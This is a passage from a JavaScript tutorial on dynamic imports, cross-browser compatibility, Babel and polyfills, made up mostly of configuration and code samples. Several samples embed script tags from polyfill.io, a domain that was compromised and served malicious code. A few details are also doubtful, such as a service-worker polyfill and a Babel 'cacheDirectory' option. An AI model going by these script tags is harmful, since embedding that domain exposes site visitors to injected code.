// ⚠️ Must resolve to a valid URL
// The path doesn't have to be static, but must be resolvable
```

**Performance Considerations:**

```javascript
// ❌ Bad - importing inside a loop
for (let i = 0; i < 100; i++) {
  const module = await import('./module.js');
  module.process(data[i]);
}

// ✅ Good - import once, use multiple times
const module = await import('./module.js');
for (let i = 0; i < 100; i++) {
  module.process(data[i]);
}

// ✅ Good - parallel imports when possible
const [moduleA, moduleB, moduleC] = await Promise.all([
  import('./moduleA.js'),
  import('./moduleB.js'),
  import('./moduleC.js')
]);
```

**Webpack Magic Comments:**

When using bundlers like Webpack, you can use special comments:

```javascript
// Name the chunk for better debugging
const module = await import(
  /* webpackChunkName: "my-chunk" */ 
  './module.js'
);

// Prefetch (low priority, load when idle)
const module = await import(
  /* webpackPrefetch: true */
  './module.js'
);

// Preload (high priority, load in parallel)
const module = await import(
  /* webpackPreload: true */
  './module.js'
);
```

**Browser Support:**

Dynamic imports are widely supported in modern browsers. For older browsers, transpilers like Babel can provide compatibility.

**Best Practices:**

1. **Use for large dependencies** - Don't over-split small modules
2. **Group related modules** - Avoid too many tiny chunks
3. **Show loading states** - Provide feedback while modules load
4. **Handle errors gracefully** - Always have fallback mechanisms
5. **Monitor bundle sizes** - Use tools to analyze what's being loaded
6. **Combine with service workers** - Cache dynamically loaded modules
7. **Test loading failures** - Simulate network errors in development

Dynamic imports are essential for modern web performance, enabling faster initial page loads and better user experiences through strategic code splitting.




# Browser Compatibility and Transpilation (81-83)

## 81. How do you ensure your JavaScript code is cross-browser compatible?

Cross-browser compatibility ensures your JavaScript code works consistently across different browsers (Chrome, Firefox, Safari, Edge) and versions. Here are comprehensive strategies to achieve this:

**1. Use Feature Detection:**

Always check if a feature exists before using it:

```javascript
// ❌ Bad - assumes feature exists
navigator.geolocation.getCurrentPosition(success, error);

// ✅ Good - check first
if ('geolocation' in navigator) {
  navigator.geolocation.getCurrentPosition(success, error);
} else {
  console.log('Geolocation not supported');
  showFallbackUI();
}

// Check for Web Storage
if (typeof Storage !== 'undefined') {
  localStorage.setItem('key', 'value');
} else {
  // Use cookies or in-memory storage
  useCookieFallback();
}

// Check for IntersectionObserver
if ('IntersectionObserver' in window) {
  const observer = new IntersectionObserver(callback);
  observer.observe(element);
} else {
  // Fallback to scroll events
  window.addEventListener('scroll', checkVisibility);
}
```

**2. Use Transpilers (Babel):**

Convert modern JavaScript to older syntax:

```javascript
// Modern ES6+ code
const greet = (name = 'Guest') => `Hello, ${name}!`;
const [first, ...rest] = [1, 2, 3, 4];
const obj = { name, age: 30 };

// Babel transpiles to ES5 for older browsers
var greet = function greet(name) {
  if (name === void 0) name = 'Guest';
  return 'Hello, ' + name + '!';
};
// ... and so on
```

**3. Use Polyfills:**

Add missing functionality for older browsers:

```javascript
// Load polyfills conditionally
async function loadPolyfills() {
  const polyfills = [];
  
  if (!Array.prototype.includes) {
    polyfills.push(import('core-js/features/array/includes'));
  }
  
  if (!window.Promise) {
    polyfills.push(import('core-js/features/promise'));
  }
  
  if (!window.fetch) {
    polyfills.push(import('whatwg-fetch'));
  }
  
  await Promise.all(polyfills);
}

// Or use a polyfill service
// <script src="https://polyfill.io/v3/polyfill.min.js"></script>
```

**4. Test Across Multiple Browsers:**

```javascript
// Use browser testing services
// - BrowserStack
// - Sauce Labs
// - LambdaTest
// - CrossBrowserTesting

// Manual testing on:
// - Chrome (latest & previous versions)
// - Firefox (latest & ESR)
// - Safari (latest & iOS)
// - Edge (latest)
// - Opera (if relevant to your audience)
```

**5. Use CSS Vendor Prefixes (when needed):**

```javascript
// Use JavaScript to add vendor prefixes
function setTransform(element, value) {
  element.style.transform = value;
  element.style.webkitTransform = value;
  element.style.mozTransform = value;
  element.style.msTransform = value;
  element.style.oTransform = value;
}

// Or use libraries like Autoprefixer (in build process)
```

**6. Avoid Browser-Specific Code:**

```javascript
// ❌ Bad - browser sniffing
if (navigator.userAgent.includes('Chrome')) {
  // Chrome-specific code
}

// ✅ Good - feature detection
if ('webkitSpeechRecognition' in window) {
  const recognition = new webkitSpeechRecognition();
}

// ✅ Better - use standardized APIs when available
const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
if (SpeechRecognition) {
  const recognition = new SpeechRecognition();
}
```

**7. Use Modern Build Tools:**

```javascript
// package.json - Configure Browserslist
{
  "browserslist": [
    "> 1%",
    "last 2 versions",
    "not dead",
    "IE 11"
  ]
}

// webpack.config.js - Configure for compatibility
module.exports = {
  module: {
    rules: [
      {
        test: /\.js$/,
        exclude: /node_modules/,
        use: {
          loader: 'babel-loader',
          options: {
            presets: [
              ['@babel/preset-env', {
                targets: '> 0.25%, not dead'
              }]
            ]
          }
        }
      }
    ]
  }
};
```

**8. Handle Events Properly:**

```javascript
// Use standard event handling
function addEventListenerCompat(element, event, handler) {
  if (element.addEventListener) {
    element.addEventListener(event, handler, false);
  } else if (element.attachEvent) {
    // IE8 and earlier
    element.attachEvent('on' + event, handler);
  } else {
    // Very old browsers
    element['on' + event] = handler;
  }
}

// Modern approach with feature detection
if (element.addEventListener) {
  element.addEventListener('click', handleClick);
}
```

**9. Use Standard DOM Methods:**

```javascript
// ✅ Good - widely supported
document.getElementById('myElement');
document.getElementsByClassName('myClass');
document.querySelectorAll('.myClass');

// ⚠️ Be careful with newer methods
if (document.querySelector) {
  const element = document.querySelector('.myClass');
}

// Check for classList support
if (element.classList) {
  element.classList.add('active');
} else {
  // Fallback for older browsers
  element.className += ' active';
}
```

**10. Handle AJAX Consistently:**

```javascript
// Use fetch with fallback
async function makeRequest(url) {
  if (window.fetch) {
    // Modern browsers
    const response = await fetch(url);
    return response.json();
  } else {
    // Fallback to XMLHttpRequest
    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open('GET', url);
      xhr.onload = () => {
        if (xhr.status === 200) {
          resolve(JSON.parse(xhr.responseText));
        } else {
          reject(new Error(`HTTP ${xhr.status}`));
        }
      };
      xhr.onerror = () => reject(new Error('Network error'));
      xhr.send();
    });
  }
}
```

**11. Normalize Date/Time Handling:**

```javascript
// Date parsing varies across browsers
// ❌ Bad - inconsistent across browsers
const date1 = new Date('2023-10-15'); // Different results in different browsers

// ✅ Good - explicit parsing
const date2 = new Date(2023, 9, 15); // Month is 0-indexed

// Or use libraries like date-fns or dayjs
import { parseISO } from 'date-fns';
const date3 = parseISO('2023-10-15');
```

**12. Use Consistent Console Logging:**

```javascript
// Wrap console methods for safety
const logger = {
  log: (...args) => {
    if (window.console && console.log) {
      console.log(...args);
    }
  },
  error: (...args) => {
    if (window.console && console.error) {
      console.error(...args);
    }
  },
  warn: (...args) => {
    if (window.console && console.warn) {
      console.warn(...args);
    }
  }
};

// Usage
logger.log('Safe logging');
```

**13. Test with Browser DevTools:**

```javascript
// Use browser-specific debugging
// Chrome DevTools: F12
// Firefox Developer Tools: F12
// Safari Web Inspector: Cmd+Option+I
// Edge DevTools: F12

// Use feature detection in console
console.log('Promise support:', 'Promise' in window);
console.log('Fetch support:', 'fetch' in window);
console.log('ServiceWorker support:', 'serviceWorker' in navigator);
```

**14. Implement Progressive Enhancement:**

```javascript
// Start with basic functionality
function initializeBasicFeatures() {
  // Core functionality that works everywhere
  setupBasicUI();
  setupBasicEvents();
}

// Add enhanced features if supported
function initializeEnhancedFeatures() {
  if ('IntersectionObserver' in window) {
    setupLazyLoading();
  }
  
  if ('requestIdleCallback' in window) {
    requestIdleCallback(performNonCriticalWork);
  }
  
  if ('animate' in Element.prototype) {
    setupAdvancedAnimations();
  }
}

// Initialize
initializeBasicFeatures();
initializeEnhancedFeatures();
```

**15. Use Linting and Code Quality Tools:**

```javascript
// .eslintrc.js - Configure ESLint for compatibility
module.exports = {
  env: {
    browser: true,
    es6: true
  },
  extends: [
    'eslint:recommended'
  ],
  parserOptions: {
    ecmaVersion: 2018,
    sourceType: 'module'
  },
  rules: {
    'no-console': 'warn',
    'no-var': 'error'
  }
};
```

**16. Handle Module Systems:**

```javascript
// Universal Module Definition (UMD) pattern
(function (root, factory) {
  if (typeof define === 'function' && define.amd) {
    // AMD
    define(['dependency'], factory);
  } else if (typeof module === 'object' && module.exports) {
    // CommonJS
    module.exports = factory(require('dependency'));
  } else {
    // Browser globals
    root.MyModule = factory(root.Dependency);
  }
}(typeof self !== 'undefined' ? self : this, function (Dependency) {
  // Module code
  return MyModule;
}));
```

**Testing Checklist:**

```javascript
// Create a compatibility testing checklist
const compatibilityTests = {
  es6Features: {
    arrowFunctions: () => (() => true)(),
    classes: () => typeof class {} === 'function',
    promises: () => 'Promise' in window,
    templateLiterals: () => true,
    destructuring: () => {
      const [a] = [1];
      return a === 1;
    }
  },
  
  domFeatures: {
    querySelector: () => 'querySelector' in document,
    classList: () => 'classList' in document.createElement('div'),
    dataset: () => 'dataset' in document.createElement('div')
  },
  
  apiFeatures: {
    fetch: () => 'fetch' in window,
    localStorage: () => {
      try {
        return 'localStorage' in window && window.localStorage !== null;
      } catch (e) {
        return false;
      }
    },
    serviceWorker: () => 'serviceWorker' in navigator
  }
};

// Run tests
function checkCompatibility() {
  const results = {};
  
  for (const [category, tests] of Object.entries(compatibilityTests)) {
    results[category] = {};
    for (const [name, test] of Object.entries(tests)) {
      try {
        results[category][name] = test();
      } catch (e) {
        results[category][name] = false;
      }
    }
  }
  
  return results;
}

console.table(checkCompatibility());
```

**Best Practices Summary:**

1. **Always use feature detection** over browser detection
2. **Transpile modern JavaScript** to older syntax
3. **Load polyfills** for missing features
4. **Test on real devices** and browsers
5. **Use progressive enhancement** approach
6. **Monitor browser usage** analytics for your audience
7. **Keep dependencies updated** for latest compatibility fixes
8. **Use standard APIs** whenever possible
9. **Provide fallbacks** for critical functionality
10. **Document browser requirements** clearly



## 82. What is Babel and how is it used in JavaScript development?

Babel is a JavaScript compiler (transpiler) that converts modern JavaScript (ES6+, ESNext) into backward-compatible versions that can run in older browsers and environments. It's an essential tool in modern JavaScript development.

**Core Purpose:**

Babel allows developers to use the latest JavaScript features without worrying about browser support, by transforming new syntax into equivalent older code.

**How Babel Works:**

```javascript
// Input: Modern JavaScript (ES6+)
const greet = (name = 'World') => {
  const message = `Hello, ${name}!`;
  return message;
};

class User {
  constructor(name) {
    this.name = name;
  }
  
  greet() {
    return `Hi, I'm ${this.name}`;
  }
}

// Output: ES5 JavaScript (after Babel compilation)
'use strict';

var greet = function greet() {
  var name = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : 'World';
  var message = 'Hello, ' + name + '!';
  return message;
};

var User = function () {
  function User(name) {
    _classCallCheck(this, User);
    this.name = name;
  }
  
  User.prototype.greet = function greet() {
    return 'Hi, I\'m ' + this.name;
  };
  
  return User;
}();
```

**Installation and Basic Setup:**

```bash
# Install Babel core packages
npm install --save-dev @babel/core @babel/cli @babel/preset-env

# Install Babel loader for webpack
npm install --save-dev babel-loader
```

**Configuration (.babelrc or babel.config.js):**

```javascript
// babel.config.js
module.exports = {
  presets: [
    ['@babel/preset-env', {
      targets: {
        browsers: ['> 1%', 'last 2 versions', 'not dead']
      },
      useBuiltIns: 'usage',
      corejs: 3
    }]
  ],
  plugins: [
    '@babel/plugin-proposal-class-properties',
    '@babel/plugin-proposal-optional-chaining'
  ]
};
```

**Key Babel Components:**

**1. Presets:**

Collections of plugins for specific transformations:

```javascript
// @babel/preset-env - Smart preset for modern JS
{
  "presets": [
    ["@babel/preset-env", {
      "targets": "> 0.25%, not dead",
      "useBuiltIns": "usage",
      "corejs": 3
    }]
  ]
}

// @babel/preset-react - For React/JSX
{
  "presets": [
    "@babel/preset-env",
    "@babel/preset-react"
  ]
}

// @babel/preset-typescript - For TypeScript
{
  "presets": [
    "@babel/preset-env",
    "@babel/preset-typescript"
  ]
}
```

**2. Plugins:**

Individual transformations for specific features:

```javascript
{
  "plugins": [
    // Class properties
    "@babel/plugin-proposal-class-properties",
    
    // Optional chaining (?.)
    "@babel/plugin-proposal-optional-chaining",
    
    // Nullish coalescing (??)
    "@babel/plugin-proposal-nullish-coalescing-operator",
    
    // Dynamic imports
    "@babel/plugin-syntax-dynamic-import",
    
    // Async/await
    "@babel/plugin-transform-async-to-generator"
  ]
}
```

**3. Polyfills:**

Babel can automatically include polyfills for missing features:

```javascript
// babel.config.js
module.exports = {
  presets: [
    ['@babel/preset-env', {
      useBuiltIns: 'usage', // Automatically import polyfills
      corejs: 3 // Use core-js version 3
    }]
  ]
};

// Input code
const result = [1, 2, 3].includes(2);
const promise = Promise.resolve(42);

// Babel automatically imports needed polyfills
import "core-js/modules/es.array.includes";
import "core-js/modules/es.promise";

const result = [1, 2, 3].includes(2);
const promise = Promise.resolve(42);
```

**Using Babel with Build Tools:**

**1. With Webpack:**

```javascript
// webpack.config.js
module.exports = {
  module: {
    rules: [
      {
        test: /\.js$/,
        exclude: /node_modules/,
        use: {
          loader: 'babel-loader',
          options: {
            presets: ['@babel/preset-env']
          }
        }
      }
    ]
  }
};
```

**2. With Rollup:**

```javascript
// rollup.config.js
import babel from '@rollup/plugin-babel';

export default {
  input: 'src/index.js',
  output: {
    file: 'dist/bundle.js',
    format: 'iife'
  },
  plugins: [
    babel({
      babelHelpers: 'bundled',
      presets: ['@babel/preset-env']
    })
  ]
};
```

**3. With Parcel:**

```javascript
// Parcel uses Babel automatically
// Just create .babelrc
{
  "presets": ["@babel/preset-env"]
}
```

**Common Use Cases:**

**1. Using Modern Syntax:**

```javascript
// Modern JavaScript
const user = {
  name: 'John',
  age: 30,
  ...additionalInfo
};

const getName = () => user?.name ?? 'Unknown';

class Component {
  state = { count: 0 };
  
  handleClick = () => {
    this.setState({ count: this.state.count + 1 });
  };
}

// Babel transforms this to work in older browsers
```

**2. JSX Transformation (React):**

```javascript
// Input: JSX
const element = (
  <div className="container">
    <h1>Hello, {name}!</h1>
    <button onClick={handleClick}>Click me</button>
  </div>
);

// Output: JavaScript
const element = React.createElement(
  'div',
  { className: 'container' },
  React.createElement('h1', null, 'Hello, ', name, '!'),
  React.createElement('button', { onClick: handleClick }, 'Click me')
);
```

**3. Async/Await Transformation:**

```javascript
// Input
async function fetchData() {
  const response = await fetch('/api/data');
  const data = await response.json();
  return data;
}

// Output (simplified)
function fetchData() {
  return _asyncToGenerator(function* () {
    const response = yield fetch('/api/data');
    const data = yield response.json();
    return data;
  })();
}
```

**Advanced Configuration:**

**Environment-Specific Config:**

```javascript
// babel.config.js
module.exports = function(api) {
  api.cache(true);
  
  const presets = [
    ['@babel/preset-env', {
      targets: process.env.NODE_ENV === 'production'
        ? '> 0.25%, not dead'
        : 'last 2 Chrome versions'
    }]
  ];
  
  const plugins = [];
  
  if (process.env.NODE_ENV === 'development') {
    plugins.push('react-refresh/babel');
  }
  
  return { presets, plugins };
};
```

**Targeting Specific Browsers:**

```javascript
{
  "presets": [
    ["@babel/preset-env", {
      "targets": {
        "chrome": "58",
        "firefox": "60",
        "safari": "11",
        "edge": "17",
        "ie": "11"
      }
    }]
  ]
}
```

**Using Browserslist:**

```javascript
// package.json
{
  "browserslist": [
    "> 1%",
    "last 2 versions",
    "not dead",
    "not ie <= 10"
  ]
}

// Babel automatically uses this configuration
```

**CLI Usage:**

```bash
# Compile a single file
npx babel script.js --out-file script-compiled.js

# Compile entire directory
npx babel src --out-dir lib

# Watch for changes
npx babel src --out-dir lib --watch

# Use specific config
npx babel src --out-dir lib --config-file ./babel.config.js
```

**Babel REPL:**

Test transformations online at https://babeljs.io/repl

```javascript
// Try transformations in real-time
// Input your modern code and see the output
```

**Performance Optimization:**

```javascript
// babel.config.js
module.exports = {
  presets: [
    ['@babel/preset-env', {
      // Only transform what's needed
      targets: 'defaults',
      
      // Reduce bundle size
      modules: false, // Keep ES modules for tree-shaking
      
      // Load polyfills efficiently
      useBuiltIns: 'usage',
      corejs: 3,
      
      // Exclude unnecessary transformations
      exclude: ['transform-typeof-symbol']
    }]
  ],
  
  // Cache compilation results
  cacheDirectory: true
};
```

**Common Plugins:**

```javascript
{
  "plugins": [
    // Object rest/spread
    "@babel/plugin-proposal-object-rest-spread",
    
    // Decorators
    ["@babel/plugin-proposal-decorators", { "legacy": true }],
    
    // Class properties
    ["@babel/plugin-proposal-class-properties", { "loose": true }],
    
    // Private methods
    "@babel/plugin-proposal-private-methods",
    
    // Dynamic import
    "@babel/plugin-syntax-dynamic-import",
    
    // Runtime helpers
    ["@babel/plugin-transform-runtime", {
      "corejs": 3
    }]
  ]
}
```

**Benefits of Using Babel:**

1. **Write Modern JavaScript** - Use latest features today
2. **Browser Compatibility** - Code works in older browsers
3. **JSX Support** - Essential for React development
4. **TypeScript Support** - Can compile TypeScript
5. **Plugin Ecosystem** - Extensible with custom transformations
6. **Smart Compilation** - Only transforms what's needed
7. **Source Maps** - Debug original code in production
8. **Future-Proof** - Adopt new features before widespread support

**When to Use Babel:**

- Building applications for wide browser support
- Using modern JavaScript features
- Developing React applications (JSX)
- Working with TypeScript
- Creating libraries that need broad compatibility
- Using experimental JavaScript proposals



## 83. What are polyfills, and when would you use them?

A polyfill is a piece of code (usually JavaScript) that provides modern functionality on older browsers that don't natively support it. The term comes from "poly" (many) and "fill" (filling gaps), meaning it "fills in" missing features.

**How Polyfills Work:**

Polyfills detect if a feature is missing and implement it using available functionality:

```javascript
// Example: Array.includes() polyfill
if (!Array.prototype.includes) {
  Array.prototype.includes = function(searchElement, fromIndex) {
    if (this == null) {
      throw new TypeError('"this" is null or not defined');
    }
    
    const O = Object(this);
    const len = O.length >>> 0;
    
    if (len === 0) return false;
    
    const n = fromIndex | 0;
    let k = Math.max(n >= 0 ? n : len - Math.abs(n), 0);
    
    while (k < len) {
      if (O[k] === searchElement) {
        return true;
      }
      k++;
    }
    
    return false;
  };
}

// Now Array.includes() works in all browsers
[1, 2, 3].includes(2); // true
```

**Common Polyfills:**

**1. Promise Polyfill:**

```javascript
// Check if Promise exists
if (typeof Promise === 'undefined') {
  // Load promise polyfill
  window.Promise = (function() {
    // Polyfill implementation
    function Promise(executor) {
      // ... implementation
    }
    
    Promise.prototype.then = function(onFulfilled, onRejected) {
      // ... implementation
    };
    
    Promise.prototype.catch = function(onRejected) {
      return this.then(null, onRejected);
    };
    
    return Promise;
  })();
}

// Or use a library
// npm install promise-polyfill
import 'promise-polyfill/src/polyfill';
```

**2. Fetch Polyfill:**

```javascript
// Check if fetch exists
if (!window.fetch) {
  // Load whatwg-fetch polyfill
  import('whatwg-fetch');
}

// Usage remains the same
fetch('/api/data')
  .then(response => response.json())
  .then(data => console.log(data));
```

**3. Object.assign Polyfill:**

```javascript
if (typeof Object.assign !== 'function') {
  Object.defineProperty(Object, 'assign', {
    value: function assign(target, ...sources) {
      if (target == null) {
        throw new TypeError('Cannot convert undefined or null to object');
      }
      
      const to = Object(target);
      
      for (let index = 0; index < sources.length; index++) {
        const nextSource = sources[index];
        
        if (nextSource != null) {
          for (const nextKey in nextSource) {
            if (Object.prototype.hasOwnProperty.call(nextSource, nextKey)) {
              to[nextKey] = nextSource[nextKey];
            }
          }
        }
      }
      
      return to;
    },
    writable: true,
    configurable: true
  });
}
```

**4. String.prototype Methods:**

```javascript
// String.startsWith()
if (!String.prototype.startsWith) {
  String.prototype.startsWith = function(search, pos) {
    pos = !pos || pos < 0 ? 0 : +pos;
    return this.substring(pos, pos + search.length) === search;
  };
}

// String.endsWith()
if (!String.prototype.endsWith) {
  String.prototype.endsWith = function(search, this_len) {
    if (this_len === undefined || this_len > this.length) {
      this_len = this.length;
    }
    return this.substring(this_len - search.length, this_len) === search;
  };
}

// String.includes()
if (!String.prototype.includes) {
  String.prototype.includes = function(search, start) {
    if (typeof start !== 'number') {
      start = 0;
    }
    
    if (start + search.length > this.length) {
      return false;
    } else {
      return this.indexOf(search, start) !== -1;
    }
  };
}
```

**When to Use Polyfills:**

**1. Supporting Older Browsers:**

```javascript
// Check browser support analytics
// If significant users on IE11 or older browsers
// Load necessary polyfills

// Example: Supporting IE11
if (!window.Promise) {
  require('promise-polyfill/src/polyfill');
}

if (!window.fetch) {
  require('whatwg-fetch');
}

if (!Array.from) {
  require('core-js/features/array/from');
}
```

**2. Using Modern JavaScript Features:**

```javascript
// When using ES6+ features in production
import 'core-js/stable';
import 'regenerator-runtime/runtime';

// Now you can safely use:
const result = [1, 2, 3].find(x => x > 1);
const promise = Promise.resolve(42);
const obj = Object.assign({}, source);
```

**3. Progressive Web Apps:**

```javascript
// Service Worker polyfill for older browsers
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js');
} else {
  // Load serviceworker-polyfill for very old browsers
  import('serviceworker-polyfill').then(() => {
    navigator.serviceWorker.register('/sw.js');
  });
}
```

**Loading Polyfills Strategically:**

**1. Conditional Loading:**

```javascript
// Only load polyfills if needed
const polyfillsNeeded = [];

if (!window.Promise) {
  polyfillsNeeded.push(import('promise-polyfill'));
}

if (!window.fetch) {
  polyfillsNeeded.push(import('whatwg-fetch'));
}

if (!Array.prototype.includes) {
  polyfillsNeeded.push(import('core-js/features/array/includes'));
}

// Load all needed polyfills
Promise.all(polyfillsNeeded).then(() => {
  // Initialize app after polyfills loaded
  initApp();
});
```

**2. Using Polyfill Service:**

```html
<!-- Polyfill.io automatically serves only needed polyfills -->
<script src="https://polyfill.io/v3/polyfill.min.js"></script>

<!-- Specify features -->
<script src="https://polyfill.io/v3/polyfill.min.js?features=Promise,fetch,Array.prototype.includes"></script>

<!-- Or let it detect automatically -->
<script crossorigin="anonymous" src="https://polyfill.io/v3/polyfill.min.js"></script>
```

**3. With Babel:**

```javascript
// babel.config.js - Automatic polyfill injection
module.exports = {
  presets: [
    ['@babel/preset-env', {
      useBuiltIns: 'usage', // Only include polyfills you use
      corejs: 3,
      targets: '> 0.25%, not dead'
    }]
  ]
};

// Babel automatically adds imports
// Input
const arr = [1, 2, 3];
arr.includes(2);

// Output (Babel adds polyfill import automatically)
import "core-js/modules/es.array.includes.js";
const arr = [1, 2, 3];
arr.includes(2);
```

**Popular Polyfill Libraries:**

**1. Core-js:**

```javascript
// Import all polyfills
import 'core-js/stable';

// Import specific polyfills
import 'core-js/features/promise';
import 'core-js/features/array/includes';
import 'core-js/features/string/starts-with';

// Use proposals (experimental features)
import 'core-js/proposals/promise-any';
```

**2. Regenerator Runtime:**

```javascript
// For async/await and generators
import 'regenerator-runtime/runtime';

// Now you can use async/await in older browsers
async function fetchData() {
  const response = await fetch('/api/data');
  return response.json();
}
```

**3. Individual Polyfills:**

```bash
# Install specific polyfills
npm install promise-polyfill
npm install whatwg-fetch
npm install intersection-observer
npm install web-animations-js
npm install smoothscroll-polyfill
```

**Real-World Example:**

```javascript
// polyfills.js - Centralized polyfill management
export async function loadPolyfills() {
  const polyfills = [];
  
  // Check and load Promise
  if (!window.Promise) {
    polyfills.push(
      import('promise-polyfill/src/polyfill')
    );
  }
  
  // Check and load Fetch
  if (!window.fetch) {
    polyfills.push(
      import('whatwg-fetch')
    );
  }
  

  // Check and load IntersectionObserver
  if (!('IntersectionObserver' in window)) {
    polyfills.push(
      import('intersection-observer')
    );
  }
  
  // Check and load Object.assign
  if (!Object.assign) {
    polyfills.push(
      import('core-js/features/object/assign')
    );
  }
  
  // Check and load Array methods
  if (!Array.prototype.find) {
    polyfills.push(
      import('core-js/features/array/find')
    );
  }
  
  if (!Array.prototype.includes) {
    polyfills.push(
      import('core-js/features/array/includes')
    );
  }
  
  // Check and load String methods
  if (!String.prototype.startsWith) {
    polyfills.push(
      import('core-js/features/string/starts-with')
    );
  }
  
  // Check and load CustomEvent
  if (typeof window.CustomEvent !== 'function') {
    polyfills.push(
      import('custom-event-polyfill')
    );
  }
  
  // Check and load classList for SVG elements
  if (!('classList' in SVGElement.prototype)) {
    polyfills.push(
      import('classlist-polyfill')
    );
  }
  
  // Wait for all polyfills to load
  await Promise.all(polyfills);
  
  console.log(`Loaded ${polyfills.length} polyfills`);
}

// main.js - Use polyfills before initializing app
import { loadPolyfills } from './polyfills.js';

async function init() {
  // Load polyfills first
  await loadPolyfills();
  
  // Now safe to use modern features
  const data = await fetch('/api/data').then(r => r.json());
  const filtered = data.items.find(item => item.active);
  
  // Initialize application
  startApp(filtered);
}

init();
```

**Advanced Polyfill Patterns:**

**1. Feature Detection Helper:**

```javascript
// features.js - Centralized feature detection
export const features = {
  promise: typeof Promise !== 'undefined',
  fetch: typeof fetch !== 'undefined',
  intersectionObserver: 'IntersectionObserver' in window,
  serviceWorker: 'serviceWorker' in navigator,
  webGL: (() => {
    try {
      const canvas = document.createElement('canvas');
      return !!(canvas.getContext('webgl') || canvas.getContext('experimental-webgl'));
    } catch (e) {
      return false;
    }
  })(),
  localStorage: (() => {
    try {
      const test = '__test__';
      localStorage.setItem(test, test);
      localStorage.removeItem(test);
      return true;
    } catch (e) {
      return false;
    }
  })(),
  customElements: 'customElements' in window,
  shadowDOM: 'attachShadow' in Element.prototype,
  webComponents: 'customElements' in window && 'attachShadow' in Element.prototype
};

// Usage
import { features } from './features.js';

if (!features.fetch) {
  await import('whatwg-fetch');
}

if (!features.intersectionObserver) {
  await import('intersection-observer');
}
```

**2. Lazy Loading Polyfills:**

```javascript
// Load polyfills only when specific features are used
class PolyfillLoader {
  constructor() {
    this.loaded = new Set();
  }
  
  async loadIfNeeded(feature, polyfillLoader) {
    if (this.loaded.has(feature)) {
      return;
    }
    
    const isSupported = this.checkFeature(feature);
    
    if (!isSupported) {
      await polyfillLoader();
      this.loaded.add(feature);
      console.log(`Loaded polyfill for: ${feature}`);
    }
  }
  
  checkFeature(feature) {
    const checks = {
      'fetch': () => 'fetch' in window,
      'promise': () => 'Promise' in window,
      'intersectionObserver': () => 'IntersectionObserver' in window,
      'resizeObserver': () => 'ResizeObserver' in window,
      'mutationObserver': () => 'MutationObserver' in window,
      'webAnimations': () => 'animate' in Element.prototype
    };
    
    return checks[feature] ? checks[feature]() : true;
  }
}

const loader = new PolyfillLoader();

// Usage - load only when needed
async function setupIntersectionObserver() {
  await loader.loadIfNeeded('intersectionObserver', () => 
    import('intersection-observer')
  );
  
  // Now safe to use
  const observer = new IntersectionObserver(callback);
  observer.observe(element);
}
```

**3. Differential Serving:**

```javascript
// Serve different bundles based on browser capabilities
// modern-bundle.js - ES6+, no polyfills
// legacy-bundle.js - ES5 + polyfills

// index.html
<script type="module" src="/modern-bundle.js"></script>
<script nomodule src="/legacy-bundle.js"></script>

// Modern browsers load module script
// Older browsers load nomodule script with polyfills
```

**4. Smart Polyfill Loading:**

```javascript
// Check user's browser and load appropriate polyfills
function getRequiredPolyfills() {
  const userAgent = navigator.userAgent;
  const polyfills = [];
  
  // IE 11
  if (userAgent.indexOf('Trident/') > -1) {
    polyfills.push('promise', 'fetch', 'array-methods', 'object-methods');
  }
  
  // Old Edge (pre-Chromium)
  if (userAgent.indexOf('Edge/') > -1) {
    polyfills.push('fetch');
  }
  
  // Old Safari
  const safariMatch = userAgent.match(/Version\/(\d+).*Safari/);
  if (safariMatch && parseInt(safariMatch[1]) < 12) {
    polyfills.push('promise', 'fetch');
  }
  
  return polyfills;
}

async function loadRequiredPolyfills() {
  const required = getRequiredPolyfills();
  const loaders = {
    'promise': () => import('promise-polyfill'),
    'fetch': () => import('whatwg-fetch'),
    'array-methods': () => import('core-js/features/array'),
    'object-methods': () => import('core-js/features/object')
  };
  
  await Promise.all(
    required.map(name => loaders[name]())
  );
}
```

**Common Polyfill Scenarios:**

**1. Form Validation:**

```javascript
// HTML5 form validation for older browsers
if (!('validity' in document.createElement('input'))) {
  // Load form validation polyfill
  import('form-validity-polyfill').then(() => {
    // Now can use constraint validation API
    const input = document.querySelector('input[type="email"]');
    if (!input.validity.valid) {
      console.log(input.validationMessage);
    }
  });
}
```

**2. Date/Time APIs:**

```javascript
// Intl polyfill for date formatting
if (!window.Intl) {
  await import('intl');
  await import('intl/locale-data/jsonp/en.js');
}

// Now safe to use
const formatter = new Intl.DateTimeFormat('en-US', {
  year: 'numeric',
  month: 'long',
  day: 'numeric'
});

console.log(formatter.format(new Date()));
```

**3. Web Components:**

```javascript
// Polyfill for Web Components
async function loadWebComponentsPolyfills() {
  if (!window.customElements) {
    await import('@webcomponents/webcomponentsjs/webcomponents-loader.js');
  }
  
  // Now can define custom elements
  class MyElement extends HTMLElement {
    connectedCallback() {
      this.innerHTML = '<p>Custom Element</p>';
    }
  }
  
  customElements.define('my-element', MyElement);
}
```

**4. Smooth Scrolling:**

```javascript
// Smooth scroll behavior polyfill
if (!('scrollBehavior' in document.documentElement.style)) {
  import('smoothscroll-polyfill').then(smoothscroll => {
    smoothscroll.polyfill();
    
    // Now smooth scrolling works
    window.scrollTo({
      top: 1000,
      behavior: 'smooth'
    });
  });
}
```

**Best Practices:**

**1. Load Only What You Need:**

```javascript
// ❌ Bad - loading everything
import 'core-js';

// ✅ Good - loading specific features
import 'core-js/features/promise';
import 'core-js/features/array/includes';
```

**2. Use Feature Detection:**

```javascript
// ❌ Bad - no detection
import 'promise-polyfill';

// ✅ Good - conditional loading
if (!window.Promise) {
  import('promise-polyfill');
}
```

**3. Consider Bundle Size:**

```javascript
// Check polyfill sizes before including
// Use bundle analyzers to see impact

// webpack-bundle-analyzer
npm install --save-dev webpack-bundle-analyzer

// Add to webpack config
const BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;

module.exports = {
  plugins: [
    new BundleAnalyzerPlugin()
  ]
};
```

**4. Test Without Polyfills:**

```javascript
// Temporarily disable polyfills to test native support
// This helps identify unnecessary polyfills

if (process.env.NODE_ENV !== 'test-native') {
  loadPolyfills();
}
```

**5. Document Polyfill Requirements:**

```javascript
// polyfills.md
/**
 * Required Polyfills:
 * 
 * - Promise (IE11)
 * - fetch (IE11, old Edge)
 * - Array.includes (IE11)
 * - Object.assign (IE11)
 * - IntersectionObserver (IE11, old Safari)
 * 
